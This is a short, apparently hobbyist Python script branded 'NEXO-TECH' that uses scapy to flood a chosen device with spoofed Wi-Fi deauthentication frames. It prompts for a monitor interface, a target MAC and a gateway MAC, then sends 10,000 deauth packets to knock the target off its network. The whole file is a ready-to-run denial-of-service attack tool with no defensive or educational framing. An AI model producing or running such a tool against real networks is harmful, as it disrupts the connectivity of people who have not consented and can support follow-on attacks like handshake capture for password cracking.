import os
import sys
import time
from scapy.all import *

# --- NEXO-TECH COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{C}{B}")
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print(f"{G}======================================================={W}")
    print(f"{Y}  MODULE:      {W}DEAUTH ATTACK ENGINE")
    print(f"{Y}  CREATED BY:  {W}NEXO-TECH")
    print(f"{Y}  STATUS:      {G}[ ONLINE ]{W}")
    print(f"{G}======================================================={W}\n")

def deauth(target_mac, gateway_mac, iface):
    # Dot11 type 0, subtype 12 is a deauth frame
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    print(f"\n{R}[!] NEXO-TECH ALERT: SENDING PACKETS...{W}")
    print(f"{G}[+] Target:  {W}{target_mac}")
    print(f"{G}[+] Gateway: {W}{gateway_mac}")
    
    try:
        # Send packets in a high-speed loop
        sendp(packet, inter=0.1, count=10000, iface=iface, verbose=1)
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Attack Stopped.{W}")

if __name__ == "__main__":
    show_banner()
    
    # Simple setup
    iface = input(f"{Y}[+] Enter Monitor Interface (e.g. wlan0mon): {W}")
    target = input(f"{Y}[+] Enter Target Device MAC: {W}")
    gateway = input(f"{Y}[+] Enter Router/Gateway MAC: {W}")
    
    show_banner()
    print(f"{C}[*] NEXO-TECH ENGINE: {G}[ RUNNING ]{W}")
    print(f"{G}-------------------------------------------------------{W}")
    
    deauth(target, gateway, iface)
